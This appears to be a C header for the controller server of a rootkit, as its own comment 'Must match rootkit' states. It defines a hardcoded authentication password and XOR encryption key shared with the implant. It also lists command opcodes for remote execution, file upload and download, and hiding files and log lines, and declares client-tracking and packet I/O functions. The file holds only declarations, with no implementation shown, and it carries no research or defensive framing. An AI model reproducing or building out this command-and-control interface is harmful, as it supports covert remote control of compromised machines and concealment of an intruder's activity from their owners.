#ifndef SERVER_H
#define SERVER_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

/* Must match rootkit */
#define WLKOM_PASSWORD "zon3p_v6fu6w"
#define CRYPTO_KEY "wlk0m_xor_k3y_32bytes_padding__"
#define CRYPTO_KEYLEN 32

#define CMD_AUTH 0x01
#define CMD_EXEC 0x02
#define CMD_UPLOAD 0x03
#define CMD_DOWNLOAD 0x04
#define CMD_HIDE_FILE 0x05
#define CMD_UNHIDE_FILE 0x06
#define CMD_HIDE_LINE 0x07
#define CMD_UNHIDE_LINE 0x08
#define CMD_PING 0x09
#define CMD_PONG 0x0A

typedef struct
{
    int fd;
    bool connected;
    bool authed;
    char remote_ip[64];
    int remote_port;
} client_t;

int server_init(int port);
int check_password(void);
void server_run(int srv_fd);
void server_close(int srv_fd);

/* Packet I/O */
int send_packet(int fd, uint8_t opcode, const char *payload, uint32_t len);
int recv_packet(int fd, uint8_t *opcode, char **payload, uint32_t *len);

#endif
